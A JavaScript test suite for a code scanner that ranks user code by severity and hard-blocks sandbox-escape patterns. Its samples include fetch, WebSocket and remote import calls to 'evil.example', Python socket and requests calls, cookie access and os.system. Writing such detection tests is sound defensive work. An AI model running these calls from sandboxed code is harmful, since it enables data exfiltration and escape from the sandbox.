import { describe, it, expect } from "vitest";
import { scanCode, severityRank } from "./codeScanner.js";

describe("scanCode severity tiers", () => {
  it("treats benign JS as safe with no findings", () => {
    const r = scanCode("const x = 1 + 2;\nconsole.log(x);", "main.js");
    expect(r.findings).toHaveLength(0);
    expect(r.maxSeverity).toBe("none");
    expect(r.safe).toBe(true);
  });

  it("treats benign Python as safe", () => {
    const r = scanCode("x = 1 + 2\nprint(x)", "main.py");
    expect(r.maxSeverity).toBe("none");
    expect(r.safe).toBe(true);
  });
});

describe("network / exfil is HARD-blocked (safe === false)", () => {
  const blocked = [
    ["JS fetch", "fetch('https://evil.example/x')", "main.js"],
    ["JS XHR", "new XMLHttpRequest()", "main.js"],
    ["JS WebSocket", "new WebSocket('wss://evil.example')", "main.js"],
    ["JS EventSource", "new EventSource('/api/store')", "main.js"],
    ["JS sendBeacon", "navigator.sendBeacon('/api', d)", "main.js"],
    ["JS dynamic import", "import('https://evil.example/m.js')", "main.js"],
    ["Python requests", "import requests\nrequests.get('http://evil')", "main.py"],
    ["Python urllib", "import urllib.request as u\nu.urlopen('http://evil')", "main.py"],
    ["Python http.client", "import http.client", "main.py"],
    ["Python socket", "import socket\nsocket.socket()", "main.py"],
    ["Python pyfetch", "from pyodide.http import pyfetch", "main.py"],
  ];
  for (const [name, code, path] of blocked) {
    it(`${name} => high + not safe`, () => {
      const r = scanCode(code, path);
      expect(r.maxSeverity).toBe("high");
      expect(r.safe).toBe(false);
    });
  }
});

describe("eval / shell / exfil escape attempts are high", () => {
  it("JS eval is high", () => {
    expect(scanCode("eval('2+2')", "main.js").safe).toBe(false);
  });
  it("JS cookie access is high", () => {
    expect(scanCode("document.cookie", "main.js").safe).toBe(false);
  });
  it("JS sandbox escape (parent) is high", () => {
    expect(scanCode("window.parent.postMessage(1, '*')", "main.js").safe).toBe(
      false,
    );
  });
  it("Python os.system is high", () => {
    expect(scanCode("import os\nos.system('ls')", "main.py").safe).toBe(false);
  });
});

describe("advisory tiers do not hard-block", () => {
  it("Python in-memory open() is low and stays runnable", () => {
    const r = scanCode("f = open('data.txt')", "main.py");
    expect(r.maxSeverity).toBe("low");
    expect(r.safe).toBe(true);
  });
  it("JS innerHTML is low and runnable", () => {
    const r = scanCode("el.innerHTML = '<b>hi</b>'", "main.js");
    expect(r.maxSeverity).toBe("low");
    expect(r.safe).toBe(true);
  });
});

describe("severityRank ordering", () => {
  it("ranks high above medium above low above none", () => {
    expect(severityRank("high")).toBeGreaterThan(severityRank("medium"));
    expect(severityRank("medium")).toBeGreaterThan(severityRank("low"));
    expect(severityRank("low")).toBeGreaterThan(severityRank("none"));
  });
});
